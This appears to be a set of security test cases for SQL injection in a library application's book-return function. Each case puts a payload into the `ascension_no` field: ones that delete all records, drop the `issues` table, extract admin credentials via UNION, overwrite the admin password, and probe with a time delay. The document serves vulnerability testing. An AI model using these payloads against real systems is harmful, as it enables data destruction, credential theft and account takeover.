### **Test Cases for SQL Injection in `returnbooks() → return_record()`**

---

#### **1. Basic SQL Injection to Delete All Records**  
**Objective**: Verify if an attacker can delete all records from the `issues` table.  
**Steps**:  
1. Log in as an admin.  
2. Issue a book with `ascension_no` set to `1 OR 1=1; --`.  
3. Navigate to **Return Books**, select the entry, and click **Return**.  
**Expected Result**: All records in the `issues` table are deleted.  
**Verification**: Confirm the `issues` table is empty via database query.  

---

#### **2. Dropping the Entire `issues` Table**  
**Objective**: Test if the `issues` table can be deleted.  
**Steps**:  
1. Log in as an admin.  
2. Issue a book with `ascension_no` set to `1; DROP TABLE issues; --`.  
3. Navigate to **Return Books**, select the entry, and click **Return**.  
**Expected Result**: The `issues` table is deleted.  
**Verification**: Check database schema for the presence of the `issues` table.  

---

#### **3. Union-Based Data Exfiltration**  
**Objective**: Extract admin credentials using a `UNION` attack.  
**Steps**:  
1. Log in as an admin.  
2. Issue a book with `ascension_no` set to:  
   ```sql
   1 UNION SELECT Username, Password, NULL, NULL, NULL, NULL FROM adm; --  
   ```  
3. Navigate to **Return Books** and view the entry.  
**Expected Result**: The Treeview displays admin usernames and passwords.  
**Verification**: Check if credentials are visible in the UI.  

---

#### **4. Privilege Escalation via SQL Injection**  
**Objective**: Modify admin credentials.  
**Steps**:  
1. Log in as an admin.  
2. Issue a book with `ascension_no` set to:  
   ```sql
   1; UPDATE adm SET Password = 'hacked' WHERE Username = 'admin'; --  
   ```  
3. Navigate to **Return Books**, select the entry, and click **Return**.  
**Expected Result**: Admin password is changed to `hacked`.  
**Verification**: Attempt to log in as `admin` with the new password.  

---

#### **5. Time-Based Blind SQL Injection**  
**Objective**: Confirm vulnerability to time-based attacks.  
**Steps**:  
1. Log in as an admin.  
2. Issue a book with `ascension_no` set to:  
   ```sql
   1; IF (SELECT COUNT(*) FROM adm) > 0 WAITFOR DELAY '0:0:5'; --  
   ```  
3. Navigate to **Return Books**, select the entry, and click **Return**.  
**Expected Result**: Application response is delayed by 5 seconds.  
**Verification**: Measure the time taken for the operation to complete.  

---

